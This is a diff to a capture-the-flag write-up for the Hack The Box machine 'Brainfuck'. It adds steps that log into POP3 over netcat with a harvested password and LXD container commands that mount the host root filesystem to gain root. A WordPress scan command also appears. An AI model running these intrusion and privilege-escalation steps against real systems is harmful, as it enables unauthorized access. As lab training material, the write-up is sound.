@@ -27,7 +27,7 @@
 + admin account username, SMTP integration and `orestis@brainfuck.htb` mail address.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/13aa2d1f-c897-4bfa-8a00-e6b4857f4843)
 
-+ Go to `/wp-admin` , and see Wordpress login page. You can try default username:passwords.
++ Go to `/wp-admin` , and see Wordpress login page. You can try default usernames:passwords.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4bb3416-457e-4aad-af23-4e967edf01ac)
 
 + Instead of brute force trial and errors, use wpscan: `wpscan --url https://brainfuck.htb/ -e ap,at,u --disable-tls-checks`
@@ -400,7 +400,12 @@ Interesting Finding(s):
 + Got the username and password for SMTP service: `orestis`:`kHGuERB29DNiNE`
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/82d080a3-84cc-4d11-beb9-56d82faaf609)
 
-+ Let’s move to the port 110 and see if this user have any emails:
++ Let’s move to the port 110 and see if this user have any emails.
++ `nc 10.10.10.17 110`
++ `USER orestis`
++ `PASS kHGuERB29DNiNE`
++ `RETR 1`
++ `RETR 2`
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc 10.10.10.17 110
@@ -537,17 +542,19 @@ ckmybrainfuckmybrainfuckmybra
 
 + Then run these commands:
 + `lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias image01`
++ `lxc image list`
 + `lxc init image01 ignite -c security.privileged=true`
 + `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
 + `lxc start ignite`
++ `lxc list`
 + `lxc exec ignite /bin/sh`
 + `cd /mnt/root/root`
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/51b549db-190c-4407-8854-02e2527e7cca)
 
 
 # References & Alternatives:
++ https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html
 + https://medium.com/@v1per/brainfuck-hackthebox-writeup-9a326bcb426a
 + https://4st1nus.gitbook.io/hackthebox/htb/hack-the-box-brainfuck-walkthrough-without-metasploit
-+ https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html
 + https://medium.com/@toneemarqus/brainfuck-htb-manual-walkthrough-2023-oscp-prep-47858603b2d6
 + https://benheater.com/hackthebox-brainfuck/
